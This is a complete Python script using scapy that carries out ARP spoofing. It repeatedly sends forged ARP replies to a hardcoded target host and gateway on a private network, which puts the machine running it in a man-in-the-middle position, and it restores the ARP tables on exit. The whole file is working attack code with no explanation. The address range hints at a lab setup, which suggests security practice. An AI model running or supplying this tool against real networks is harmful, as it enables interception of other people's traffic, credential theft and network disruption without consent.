#!/usr/bin/python3
import time
import scapy.all as scapy

def mac_scan(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast / arp_request
    ans_list = scapy.srp(arp_broadcast, timeout=5, verbose=False)[0]
    return ans_list[0][1].hwsrc

def poison(target_ip, spoof_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac_scan(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(dest_ip, source_ip):
    dest_mac = mac_scan(dest_ip)
    source_mac = mac_scan(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False)


if __name__ == "__main__":
    target_ip = "192.168.58.129"
    gateway_ip = "192.168.58.1"
    try:
        packet_count = 0
        while True:
            poison(target_ip, gateway_ip)
            poison(gateway_ip, target_ip)
            packet_count += 2
            print(f"\r[*] Packets Sent: {packet_count}")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nExitting...")
        restore(gateway_ip, target_ip)
        restore(target_ip, gateway_ip)
        print("[!] ARP Spoofing Stopped")

